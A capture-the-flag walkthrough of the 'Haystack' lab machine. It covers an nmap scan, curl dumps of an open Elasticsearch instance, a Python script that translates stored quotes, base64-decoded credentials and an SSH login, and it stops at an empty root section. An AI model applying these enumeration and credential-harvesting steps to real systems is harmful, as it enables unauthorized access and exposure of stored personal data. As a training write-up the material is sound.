# Haystack
```
Difficulty: Easy
Operating System: Linux
Hints: True
```
## Initial Enumeration
Running nmap scan (TCP) on the target shows the following results:
```
Nmap scan report for 10.10.10.115
Host is up (0.083s latency).
Not shown: 993 filtered tcp ports (no-response), 4 filtered tcp ports (host-prohibited)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.4 (protocol 2.0)
| ssh-hostkey:
|   2048 2a:8d:e2:92:8b:14:b6:3f:e4:2f:3a:47:43:23:8b:2b (RSA)
|   256 e7:5a:3a:97:8e:8e:72:87:69:a3:0d:d1:00:bc:1f:09 (ECDSA)
|_  256 01:d2:59:b2:66:0a:97:49:20:5f:1c:84:eb:81:ed:95 (ED25519)
80/tcp   open  http    nginx 1.12.2
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: nginx/1.12.2
9200/tcp open  http    nginx 1.12.2
|_http-title: 502 Bad Gateway
|_http-server-header: nginx/1.12.2
```
If we dig into port 80, we can see that we cannot see anything relevant, just an image showing a needle in a haystack.  
If we try to download this image and execute exiftool aganist it we do not see any relevant information, so we can proceed with port 9200.  
As soon as we open port 9200 we can see elasticsearch service configured.  
In order to enumerate elasticsearch and probe indices, we can go over [book.hacktricks.xyz](https://book.hacktricks.xyz/pentesting/9200-pentesting-elasticsearch).  
As we can see here, to enumerate indices we can perform the following request:
```
[root@kali Haystack ]$ curl -s http://$TARGET:9200/_cat/indices                                              
green  open .kibana 6tjAYZrgQ5CwwR0g6VOoRg 1 0    1 0     4kb     4kb
yellow open quotes  ZG2D1IqkQNiNZmi2HRImnQ 5 1  253 0 262.7kb 262.7kb
yellow open bank    eSVpNfCfREyYoVigNWcrMw 5 1 1000 0 483.2kb 483.2kb
```
Also according to [book.hacktricks.xyz](https://book.hacktricks.xyz/pentesting/9200-pentesting-elasticsearch) for elasticsearch we can enumerate the indexes using the following query:
```
[root@kali Haystack ]$ curl -s http://$TARGET:9200/bank/_search\?size\=1000 | jq '.hits .hits[] ._source .email'
[... SNIP ...]
"virginiaayala@filodyne.com"
"aureliaharding@orbalix.com"
"ratliffheath@zappix.com"
"lavernejohnson@senmei.com"
"effiegates@digitalus.com"
"rowenawilkinson@asimiline.com"
"hudsonenglish@xinware.com"
"blakedavidson@quantasis.com"
"garciahess@quiltigen.com"
"rachellerice@enaut.com"
[... SNIP ...]
```
So, at this point we may notice that there is a field called "total" inside "hits" that indicates that 1000 documents were found inside this index but only 10 were retried. This is because by default there is a limit of 10 documents.  
But, now that you know that this index contains 1000 documents, you can dump all of them indicating the number of entries you want to dump in the size parameter.  
Now let's enumerate the quote index.  

## User
Using the previous method to enumerate elastic for the quote index, we can see that the index is filled with Spanish quotes, so before starting let's translate them.  
To do so, let's build the following python script:  
```
import requests, json
from deep_translator import GoogleTranslator

r=requests.get('http://10.10.10.115:9200/quotes/_search?size=253');
quotes=json.loads(r.text)

for i in range(0, len(quotes['hits']['hits'])):
    q=quotes['hits']['hits'][i]
    t=q['_source']['quote']
    translation = GoogleTranslator(source='auto', target='en').translate(t)
    print(translation)
```
now that we have all the quotes translated we can search in the output for keywords that may represent any credential to access this box like secret, key,password, passwd and so on.  
we can find the following:  
```
I have to save the key for the machine: dXNlcjogc2VjdXJpdHkg   
This key cannot be lost, I keep it here: cGFzczogc3BhbmlzaC5pcy5rZXk=
```  
Let's base64 decode:  
```
[root@kali Haystack ]$ echo "dXNlcjogc2VjdXJpdHkg" | base64 -d
user: security #    
[root@kali Haystack ]$ echo "cGFzczogc3BhbmlzaC5pcy5rZXk=" | base64 -d
pass: spanish.is.key#  
```
now, if we try this user/pass combination with SSH service (the only service that is exposing a login) we can login as user security:
```
[root@kali Haystack ]$ ssh $TARGET -l security                    
security@10.10.10.115's password:
Last login: Fri Feb 18 12:03:21 2022 from 10.10.14.24
[security@haystack ~]$
```

## Root
